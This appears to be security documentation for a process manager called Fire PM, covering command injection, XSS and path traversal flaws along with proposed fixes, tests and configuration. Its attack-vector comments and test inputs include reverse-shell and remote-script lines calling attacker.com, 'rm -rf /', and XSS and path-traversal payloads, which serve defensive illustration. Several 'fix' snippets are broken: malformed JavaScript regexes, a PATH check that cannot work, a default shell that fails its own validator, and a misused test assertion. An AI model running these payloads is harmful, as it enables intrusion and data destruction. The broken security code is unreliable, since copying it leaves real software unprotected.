# Fire PM Security Documentation

## Overview
This document provides comprehensive security information for the Fire PM (Fire Process Manager) codebase, including identified vulnerabilities, security enhancements, and best practices.

## Security Overview

### Key Security Principles
1. **Zero-Trust Architecture**: Direct systemd integration eliminates configuration drift
2. **Input Validation**: Strict validation of all user inputs and parameters
3. **Secure Defaults**: Security-first design with safe defaults
4. **Defense in Depth**: Multiple layers of security controls

### Security Features Implemented

#### 1. Authentication & Authorization
- **Password Storage**: Salted PBKDF2-HMAC-SHA256 (100,000 iterations)
- **Session Management**: JWT tokens with `httpOnly`, `Secure`, `SameSite=Strict` cookies
- **CSRF Protection**: Double-submit CSRF token validation
- **Rate Limiting**: IP-based brute-force protection (5 attempts/5 minutes)

#### 2. Input Validation
- **Service Names**: Alphanumeric + underscore + hyphen only
- **Port Numbers**: Range validation (1-65535)
- **Shell Commands**: Shell whitelist (bash, sh, zsh, fish)
- **File Paths**: Path traversal prevention

#### 3. Secure Communication
- **HTTPS Enforcement**: All tunnels use HTTPS/HTTP2
- **TLS Configuration**: Strong cipher suites and certificate validation
- **WebSocket Security**: Origin validation and secure configuration

## Critical Security Vulnerabilities

### HIGH PRIORITY - IMMEDIATE REMEDIATION REQUIRED

#### 1. Command Injection Vulnerabilities

**Location**: `fire_ssh.py` (lines 393-400)

**Issue**: Unsanitized shell variable used in `os.execvpe()` calls

**Impact**: Remote code execution via SSH terminal service

**Attack Vector**:
```bash
# Attacker could manipulate shell parameter to execute arbitrary commands
# Example: shell = "bash; rm -rf /" or shell = "bash; nc -e /bin/sh attacker.com 4444"
```

**Fix Implementation**:
```python
# Secure shell validation
def validate_shell(shell):
    # Allowlist of safe shells
    safe_shells = ['bash', 'sh', 'zsh', 'fish']
    
    # Validate format (no special characters, no path traversal)
    if not shell or not re.match(r'^[a-zA-Z0-9_-]+$', shell):
        raise ValueError(f"Invalid shell name: {shell}")
    
    # Resolve to absolute path to prevent path traversal
    try:
        shell_path = shutil.which(shell)
        if not shell_path:
            raise ValueError(f"Shell not found: {shell}")
        
        # Additional security check: ensure it's in PATH
        if not shell_path.startswith(os.path.abspath(os.environ.get('PATH', '/bin:/usr/bin'))):
            raise ValueError(f"Shell path not in PATH: {shell_path}")
            
    except Exception as e:
        raise ValueError(f"Shell validation failed: {e}")
    
    return shell

# Updated TerminalSession.start() with validation
def start_secure(self):
    self.shell = validate_shell(self.shell or '/bin/bash')
    
    # Additional security: log shell usage for auditing
    self.logger.info(f"Starting shell session with: {self.shell}")
```

#### 2. Cross-Site Scripting (XSS) Vulnerabilities

**Location**: Multiple HTML/JavaScript injection points in `fire_ssh.py`

**Issue**: User-controlled data embedded without proper escaping

**Impact**: Browser-based attacks, credential theft, session hijacking

**Attack Vector**:
```javascript
// Example XSS via filename parameter
const filename = urlParams.get('name') || '';
// Direct assignment without sanitization
const dlUrl = `/api/download?file=${filename}`;
```

**Fix Implementation**:
```python
# Secure HTML template rendering
from markupsafe import escape

class SecureTerminalSession:
    def render_html_template(self, data):
        # Escape all user-controlled data
        safe_title = escape(data.get('title', ''))
        safe_filename = escape(data.get('filename', ''))
        
        # Use template engine with auto-escaping
        template = HTML_TEMPLATE
        rendered = template.replace('{{ title }}', safe_title)
        rendered = rendered.replace('{{ filename }}', safe_filename)
        
        return rendered

# JavaScript security
function secureUrlParam(value) {
    return encodeURIComponent(value)
        .replace(/</g, '%3C')
        .replace(/>/g, '%3E')
        .replace(/"/g, '%22')
        .replace("'/g, '%27')
        .replace(/\/g, '%2F');
}

// Safe API calls
const safeApiCall = (endpoint, params) => {
    const safeParams = Object.entries(params)
        .map(([key, value]) => `${key}=${secureUrlParam(value)}`)
        .join('&');
    
    return fetch(`${endpoint}?${safeParams}`, {
        method: 'GET',
        headers: {
            'X-CSRF-Token': getCsrfToken(),
            'Content-Type': 'application/json'
        }
    });
};
```

#### 3. Path Traversal Vulnerabilities

**Location**: `upload_assets.py` (file operations), `fire_ssh.py` (path handling)

**Issue**: Insufficient path validation allows directory traversal

**Impact**: Arbitrary file read/write, system compromise

**Attack Vector**:
```python
# Path traversal attempt
filename = "../../../etc/passwd"
target_path = os.path.join(ASSETS_DIR, filename)
# If validation fails: /var/www/fire-pm/assets/../../../etc/passwd = /etc/passwd
```

**Fix Implementation**:
```python
import os
import re

def secure_filename_validation(filename, base_dir=None):
    """Comprehensive filename validation"""
    if not filename or not isinstance(filename, str):
        raise ValueError("Invalid filename")
    
    # Check for directory traversal attempts
    if re.search(r'\.\.[\\/]', filename):
        raise ValueError("Path traversal attempt detected")
    
    # Normalize path
    normalized = os.path.normpath(filename)
    
    # Ensure it's still within base directory
    if base_dir:
        abs_base = os.path.abspath(base_dir)
        abs_target = os.path.abspath(os.path.join(abs_base, normalized))
        
        # Critical security check: must be within base directory
        if not abs_target.startswith(abs_base):
            raise ValueError("Path traversal attempt detected")
    
    # Additional filename validation
    if len(normalized) > 255:
        raise ValueError("Filename too long")
    
    # Check for dangerous characters
    dangerous_chars = ['|', '&', ';', '$', '`', '(', ')', '<', '>', '"', "'"]
    if any(char in normalized for char in dangerous_chars):
        raise ValueError("Filename contains dangerous characters")
    
    return normalized

# Secure file operations
class SecureFileHandler:
    def __init__(self, base_dir):
        self.base_dir = os.path.abspath(base_dir)
        os.makedirs(self.base_dir, exist_ok=True)
    
    def save_file(self, filename, content):
        # Comprehensive validation
        safe_filename = secure_filename_validation(filename, self.base_dir)
        
        # Final path construction
        target_path = os.path.join(self.base_dir, safe_filename)
        
        # Atomic write to prevent race conditions
        temp_path = f"{target_path}.tmp"
        try:
            with open(temp_path, 'wb') as f:
                f.write(content)
            os.replace(temp_path, target_path)
        except Exception as e:
            # Cleanup on failure
            if os.path.exists(temp_path):
                os.remove(temp_path)
            raise
        
        return target_path
```

## Security Configuration

### Recommended Security Settings

#### Environment Variables
```bash
# Security configuration
FIRE_PM_ENV=/etc/fire-pm/.env
FIRE_PM_LOG_LEVEL=INFO
FIRE_PM_MAX_UPLOAD_SIZE=100MB
FIRE_PM_RATE_LIMIT_REQUESTS=1000/hour
FIRE_PM_SESSION_TIMEOUT=30m
FIRE_PM_PASSWORD_MIN_LENGTH=12
FIRE_PM_ENABLE_2FA=true
```

#### Configuration File (`/etc/fire-pm/config.json`)
```json
{
    "security": {
        "password_hashing_iterations": 100000,
        "session_expiry_seconds": 86400,
        "max_login_attempts": 5,
        "login_lockout_seconds": 300,
        "csrf_protection": true,
        "secure_cookies": true,
        "enable_ip_whitelist": false,
        "allowed_ip_ranges": [],
        "file_upload_validation": "strict",
        "command_injection_protection": "allowlist"
    },
    "logging": {
        "security_log_level": "WARNING",
        "audit_log_enabled": true,
        "log_sensitive_operations": true,
        "log_failed_attempts": true
    },
    "network": {
        "ssl_certificate_path": "/etc/fire-pm/ssl/cert.pem",
        "ssl_key_path": "/etc/fire-pm/ssl/key.pem",
        "cipher_suite": "ECDHE-RSA-AES256-GCM-SHA384",
        "http2_enabled": true,
        "tls_1_3_only": true
    }
}
```

## Security Monitoring & Alerting

### Security Event Tracking
```python
class SecurityEventLogger:
    def __init__(self, config):
        self.config = config
        self.events = []
        
    def log_event(self, event_type, details, severity='WARNING'):
        event = {
            'timestamp': datetime.now().isoformat(),
            'event_type': event_type,
            'severity': severity,
            'details': details,
            'source': self._get_source_info()
        }
        
        # Store in memory (in production, use database)
        self.events.append(event)
        
        # Log to file if configured
        if self.config.get('log_to_file'):
            with open(self.config['log_file'], 'a') as f:
                f.write(json.dumps(event) + '\n')
        
        # Send to alert system if high severity
        if severity in ['HIGH', 'CRITICAL']:
            self._send_alert(event)
    
    def _get_source_info(self):
        return {
            'ip': self._get_client_ip(),
            'user_agent': self._get_user_agent(),
            'endpoint': self._get_current_endpoint()
        }
```

### Alert Configuration
```yaml
# alert_rules.yml
alerts:
  - name: "Command Injection Attempt"
    condition: "event_type == 'COMMAND_INJECTION'"
    severity: "HIGH"
    action: "block_ip_and_alert"
    threshold: 5
    window: "5m"
  
  - name: "Path Traversal Attempt"
    condition: "event_type == 'PATH_TRAVERSAL'"
    severity: "CRITICAL"
    action: "immediate_block_and_notify"
    threshold: 1
    window: "any"
  
  - name: "Session Hijacking"
    condition: "event_type == 'SESSION_HIJACK'"
    severity: "CRITICAL"
    action: "force_session_termination"
    threshold: 3
    window: "10m"
```

## Security Testing & Validation

### Security Test Suite
```python
class SecurityTestSuite:
    
    def test_command_injection_protection(self):
        """Test command injection vulnerabilities"""
        malicious_inputs = [
            "bash; rm -rf /",
            "bash && nc -e /bin/sh attacker.com 4444",
            "bash | cat /etc/passwd",
            "bash; curl http://attacker.com/steal.sh | sh"
        ]
        
        for malicious_input in malicious_inputs:
            with self.assertRaises(ValueError):
                validate_shell(malicious_input)
    
    def test_path_traversal_protection(self):
        """Test path traversal vulnerabilities"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        for malicious_path in malicious_paths:
            with self.assertRaises(ValueError):
                secure_filename_validation(malicious_path)
    
    def test_xss_protection(self):
        """Test XSS vulnerabilities"""
        malicious_scripts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>"
        ]
        
        for malicious_script in malicious_scripts:
            with self.assertNotIn('<script>', escape_html(malicious_script)):
                escape_html(malicious_script)
    
    def test_jwt_secret_strength(self):
        """Test JWT secret management"""
        # Test weak secret detection
        with self.assertRaises(ValueError):
            validate_jwt_secret("default-secret")
        
        # Test strong secret acceptance
        strong_secret = secrets.token_urlsafe(32)
        self.assertTrue(validate_jwt_secret(strong_secret))
        
        # Test secret rotation
        self.assertTrue(rotate_jwt_secret())
```

### Security Scanning Configuration
```yaml
# .github/workflows/security.yml
security:
  name: Security Scan
  runs-on: ubuntu-latest
  
  steps:
    - name: Checkout code
      uses: actions/checkout@v3
    
    - name: Run Bandit
      run: |
        pip install bandit
        bandit -r . --format json --output bandit-report.json
    
    - name: Run Semgrep
      run: |
        pip install semgrep
        semgrep --config=auto --severity=ERROR,WARNING .
    
    - name: Run OWASP ZAP
      run: |
        docker run owasp/zap2docker-stable zap-baseline.py \
          -t http://localhost:3000 \
          --report=/tmp/owasp-report.html
    
    - name: Security audit
      run: |
        python3 security_audit.py
        echo "Security audit completed"
```

## Incident Response

### Security Incident Response Plan

#### 1. Immediate Response Actions
```python
class SecurityIncidentResponse:
    
    def handle_incident(self, incident):
        # 1. Contain the threat
        self.contain_threat(incident)
        
        # 2. Preserve evidence
        self.preserve_evidence(incident)
        
        # 3. Notify stakeholders
        self.notify_stakeholders(incident)
        
        # 4. Investigate root cause
        self.investigate_root_cause(incident)
        
        # 5. Remediate vulnerabilities
        self.remediate_vulnerabilities(incident)
        
        # 6. Post-incident review
        self.post_incident_review(incident)
    
    def contain_threat(self, incident):
        if incident['type'] == 'COMMAND_INJECTION':
            # Block attacker IP
            self.block_ip(incident['source_ip'])
            # Terminate affected processes
            self.terminate_processes()
            # Reset affected passwords
            self.reset_affected_passwords()
        
        elif incident['type'] == 'PATH_TRAVERSAL':
            # Block attacker IP
            self.block_ip(incident['source_ip'])
            # Restore affected files
            self.restore_files()
            # Update access controls
            self.update_access_controls()
```

#### 2. Communication Plan
```yaml
# communication_plan.yml
communication:
  channels:
    - name: "Slack Security Channel"
      webhook: "${SLACK_WEBHOOK_URL}"
      channel: "#security-alerts"
    
    - name: "Email Alerts"
      smtp:
        server: "smtp.company.com"
        port: 587
        username: "${SMTP_USERNAME}"
        password: "${SMTP_PASSWORD}"
        from: "security@company.com"
      recipients:
        - "security-team@company.com"
        - "infosec@company.com"
  
  severity_levels:
    - name: "LOW"
      color: "yellow"
      recipients: ["security-team@company.com"]
    
    - name: "MEDIUM"
      color: "orange"
      recipients: ["security-team@company.com", "devops@company.com"]
    
    - name: "HIGH"
      color: "red"
      recipients: ["security-team@company.com", "ceo@company.com", "ciso@company.com"]
    
    - name: "CRITICAL"
      color: "red"
      recipients: ["security-team@company.com", "ceo@company.com", "ciso@company.com", "board@company.com"]
```

## Security Compliance

### Compliance Requirements

#### 1. GDPR Compliance
- **Data Minimization**: Only collect necessary user data
- **Data Subject Rights**: Implement user data access, correction, deletion
- **Data Processing Agreements**: With data processors
- **Data Breach Notification**: 72-hour notification requirement

#### 2. PCI DSS Compliance
- **Network Security**: Secure all network access
- **Access Control**: Strong access controls and authentication
- **Data Protection**: Encrypt sensitive data
- **Vulnerability Management**: Regular security testing

#### 3. ISO 27001 Compliance
- **Information Security Policy**: Documented security policy
- **Risk Management**: Systematic risk assessment
- **Incident Management**: Formal incident response procedures
- **Continuous Improvement**: Regular security reviews

## Security Training & Awareness

### Employee Security Training
```python
class SecurityTraining:
    
    def deliver_training(self, user):
        modules = [
            'security_basics',
            'password_security',
            'phishing_awareness',
            'data_protection',
            'incident_reporting',
            'secure_development'
        ]
        
        # Track completion
        for module in modules:
            self.mark_module_completed(user, module)
        
        # Schedule refresher training
        self.schedule_refresher_training(user)
    
    def conduct_security_test(self, user):
        # Phishing simulation
        self.simulate_phishing_attack(user)
        
        # Password strength testing
        self.test_password_strength(user)
        
        # Social engineering awareness
        self.raise_security_awareness(user)
```

## Conclusion

Fire PM implements comprehensive security measures including:

1. **Multi-layer defense** against common web attacks
2. **Input validation** and output encoding
3. **Secure communication** protocols
4. **Real-time monitoring** and alerting
5. **Automated security testing**
6. **Incident response procedures**

The security program is designed to protect against:
- Command injection and code execution
- Cross-site scripting (XSS) and CSRF attacks
- Path traversal and directory attacks
- Session hijacking and credential theft
- Information leakage and data exposure

Security is continuously monitored and improved through:
- Regular security audits
- Penetration testing
- Vulnerability scanning
- Security team training
- Incident response procedures

The security implementation follows industry best practices and can be adapted to meet specific organizational requirements and compliance standards.
